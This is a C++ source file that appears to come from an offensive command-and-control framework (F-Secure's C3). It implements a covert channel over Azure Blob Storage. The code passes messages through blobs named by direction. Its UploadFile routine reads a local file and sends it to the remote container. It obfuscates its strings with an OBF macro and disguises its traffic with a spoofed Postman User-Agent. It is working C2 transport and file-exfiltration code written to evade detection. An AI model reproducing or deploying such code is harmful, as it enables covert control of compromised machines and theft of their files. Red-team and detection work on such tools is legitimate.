#include "stdafx.h"
#include "AzureBlobStorageApi.h"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/WinHttp/HttpClient.h"
#include "Common/FSecure/WinHttp/Constants.h"
#include "Common/FSecure/WinHttp/Uri.h"
#include "Common/rapidxml-1.13/rapidxml.hpp"
#include <random>
#include <cctype>
#include <algorithm>
#include <string>
#include <fstream>

using namespace FSecure::StringConversions;
using namespace FSecure::WinHttp;
using namespace rapidxml;

namespace
{
	std::wstring ToWideString(std::string const& str)
	{
		return Convert<Utf16>(str);
	}
}

FSecure::AzureBlobStorage::AzureBlobStorage(std::string const& sasToken, std::string const& storageAccountName, std::string const& containerName, std::string const& channelName)
{
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);

	this->m_sasToken = sasToken;
	this->m_storageAccountName = storageAccountName;
	this->m_containerName = containerName;

	std::string lowerChannelName = channelName;
	std::transform(lowerChannelName.begin(), lowerChannelName.end(), lowerChannelName.begin(), [](unsigned char c) { return std::tolower(c); });
	SetChannel(CreateChannel(lowerChannelName));
}

void FSecure::AzureBlobStorage::SetChannel(std::string const& channelName)
{
	this->m_Channel = channelName;
}

void FSecure::AzureBlobStorage::SetToken(std::string const& sasToken)
{
	this->m_sasToken = sasToken;
}

void FSecure::AzureBlobStorage::WriteMessageToFile(std::string const& direction, ByteView data, std::string const& providedFilename)
{
	std::string filename;

	if (providedFilename == "")
	{
		std::string ts = std::to_string(FSecure::Utils::MillisecondsTimestamp());
		filename = direction + OBF("-") + FSecure::Utils::GenerateRandomString(10) + OBF("-") + ts;
		//std::cout << ts;
	}
	else
		filename = providedFilename;
	std::string blobPath = OBF("/") + this->m_Channel + OBF("/") + filename + OBF("?");

	SendHttpRequest(blobPath, ContentType::ApplicationOctetstream, Method::PUT, data);
}



std::map<std::string, std::string> FSecure::AzureBlobStorage::ListChannels()
{
	std::map<std::string, std::string> channelMap;
	xml_document<> doc;
	xml_node<>* root_node;

	FSecure::ByteVector response = SendHttpRequest("?restype=container&comp=list&", ContentType::TextPlain, Method::GET);
	std::string stringResponse = { response.begin(), response.end() };
	
	doc.parse<0>(&stringResponse[0]); 
	root_node = doc.first_node("EnumerationResults");
	xml_node<>* blobsNode = doc.first_node("EnumerationResults")->first_node("Blobs");

	for (xml_node<>* singleBlobNode = blobsNode->first_node("Blob"); singleBlobNode; singleBlobNode = singleBlobNode->next_sibling())
	{
		std::string blobName;
		blobName = singleBlobNode->first_node("Name")->value();

		if (blobName.back() != '/')
		{
			continue; // blobName == a channelName iff it is a directory
		}

		blobName.erase(std::remove(blobName.begin(), blobName.end(), '/'),blobName.end()); // remove trailing '/' (probs a better way to do this)

		xml_node<>* propertiesNode = singleBlobNode->first_node("Properties"); 
		
		std::string blobId = propertiesNode->first_node("Etag")->value();
		

		channelMap.insert({ blobName, blobId }); // bit budget but will use the directory's ETag as channel ID

	}

	return channelMap;
}



std::string FSecure::AzureBlobStorage::CreateChannel(std::string const& channelName)
{
	std::map<std::string, std::string> channels = this->ListChannels();
	std::string blobPath;
	std::string	errorMsg;
	std::vector<uint8_t> data;
	FSecure::ByteVector response;

	if (channels.find(channelName) == channels.end())
	{
		blobPath = OBF("/") + channelName + OBF("/?");
		response = SendHttpRequest(blobPath, ContentType::TextPlain, Method::PUT);
	}
	else
	{
		DeleteFile(channelName + "/");
		blobPath = OBF("/") + channelName + OBF("/?");
		response = SendHttpRequest(blobPath, ContentType::TextPlain, Method::PUT);
	}


	return channelName;
}


std::vector<std::string> FSecure::AzureBlobStorage::SplitBlobName(const std::string& blobName)
{
	char delimiter = '/';
	size_t i = blobName.rfind(delimiter, blobName.length());
	if (i != std::string::npos) {
		std::vector<std::string> splitName = {blobName.substr(0, i) , blobName.substr(i + 1, blobName.length() - i) };
		return splitName;
	}
	std::vector<std::string> splitName = {"",""};
	return(splitName);
}

FSecure::ByteVector FSecure::AzureBlobStorage::ReadFile(std::string const& filename)
{
	std::string blobPath = OBF("/") + filename + OBF("?");
	FSecure::ByteVector response;

	response = SendHttpRequest(blobPath, ContentType::ApplicationOctetstream, Method::GET);
	return response;
}

void FSecure::AzureBlobStorage::DeleteFile(std::string const& filename)
{
	std::string blobPath = OBF("/") + filename + OBF("?");
	SendHttpRequest(blobPath, ContentType::ApplicationOctetstream, Method::DEL);
}

void FSecure::AzureBlobStorage::UploadFile(std::string const& path)
{
	std::filesystem::path filepathForUpload = path;
	auto readFile = std::ifstream(filepathForUpload, std::ios::binary);

	ByteVector packet = ByteVector{ std::istreambuf_iterator<char>{readFile}, {} };
	readFile.close();

	std::string ts = std::to_string(FSecure::Utils::MillisecondsTimestamp());
	std::string fn = filepathForUpload.filename().string();  // retain same file name and file extension for convenience.
	std::string filename = OBF("upload-") + FSecure::Utils::GenerateRandomString(10) + OBF("-") + ts + OBF("-") + fn;

	WriteMessageToFile("", packet, filename);
}

std::map<std::string, std::string> FSecure::AzureBlobStorage::GetMessagesByDirection(std::string const& direction)
{
	std::map<std::string, std::string> messages;
	std::string cursor;

	xml_document<> doc;
	xml_node<>* root_node; 

	FSecure::ByteVector response = SendHttpRequest("?restype=container&comp=list&prefix=" + this->m_Channel + "&", ContentType::TextPlain, Method::GET);
	std::string stringResponse = { response.begin(), response.end() };

	doc.parse<0>(&stringResponse[0]);
	root_node = doc.first_node("EnumerationResults");
	xml_node<>* blobsNode = doc.first_node("EnumerationResults")->first_node("Blobs");
	for (xml_node<>* singleBlobNode = blobsNode->first_node("Blob"); singleBlobNode; singleBlobNode = singleBlobNode->next_sibling())
	{
		std::string blobName;
		blobName = singleBlobNode->first_node("Name")->value();

		if (blobName.back() == '/') // same as listing channels except this time we exclude for ending in '/'
		{
			continue; // blobName == a channelName iff it is a directory
		}


		if (blobName.find(direction) != std::string::npos) {
			std::string ts = blobName.substr(blobName.length() - 7); // 10 = epoch time length
			messages.insert({ ts, blobName });
		}


	}
	return messages;
}




FSecure::ByteVector FSecure::AzureBlobStorage::SendHttpRequest(std::string const& blobPath, WinHttp::ContentType contentType, WinHttp::Method method, std::string const& data)
{
	std::string Url;
		while (true)
		{
			Url = OBF("https://") + this->m_storageAccountName + OBF(".blob.core.windows.net/") + this->m_containerName + blobPath + this->m_sasToken;
			HttpClient webClient(ToWideString(Url), m_ProxyConfig);
			HttpRequest request; // default request is GET

			request.m_Method = method; // removed from loop to support DELETE requests

			if (method == Method::PUT) // should add check that contentType isn't empty too
			{
				request.SetData(contentType, { data.begin(), data.end() });
				request.SetHeader(OBF(L"x-ms-blob-type"), OBF(L"BlockBlob"));
			}

			request.SetHeader(Header::UserAgent, ToWideString("PostmanRuntime/7.26.10"));
			request.SetData(contentType, { data.begin(), data.end() });
			auto resp = webClient.Request(request);

			if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Accepted || resp.GetStatusCode() == StatusCode::Created || resp.GetStatusCode() == StatusCode::NotFound) {
				return resp.GetData();
			}
			else if (resp.GetStatusCode() == StatusCode::TooManyRequests) {
				std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
			}
			else {
				throw std::exception(OBF("[x] Non 200/201/202/429 HTTP Response\n"));
			}
		}
}

